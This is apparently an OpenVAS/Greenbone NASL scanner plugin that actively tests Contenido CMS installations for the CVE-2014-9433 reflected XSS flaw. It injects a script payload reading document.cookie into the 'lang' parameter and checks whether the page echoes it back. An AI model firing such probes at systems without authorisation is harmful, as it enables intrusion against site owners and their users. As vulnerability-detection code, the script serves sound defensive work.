# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805231");
  script_version("2025-08-01T15:45:48+0000");
  script_tag(name:"last_modification", value:"2025-08-01 15:45:48 +0000 (Fri, 01 Aug 2025)");
  script_tag(name:"creation_date", value:"2014-12-26 15:09:14 +0530 (Fri, 26 Dec 2014)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-9433");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Contenido CMS 4.9.x < 4.9.6 Multiple XSS Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Contenido CMS is prone to multiple cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'idart', 'lang', or 'idcat' GET parameters
  to cms/front_content.php script is not properly sanitised before being returned to the user
  within the 'checkParams' function.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a users browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Contenido CMS version 4.9.x through 4.9.5.");

  script_tag(name:"solution", value:"Update to version 4.9.6 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/61396");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129713");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Dec/111");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/", "/contenido", "/cms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/front_content.php" );

  if( !res || res !~ "^HTTP/1\.[01] 200" ||
      ( res !~ "content=.CMS CONTENIDO" && "front_content.php?idcat=" >!< res ) )
    continue;

  url = dir + "/front_content.php?idcat=&lang=<script>alert(document.cookie)</script>";

  ## Extra Check not possible
  if( http_vuln_check( port:port, url:url, check_header:TRUE,
                       pattern:"<script>alert\(document\.cookie\)</script>" ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
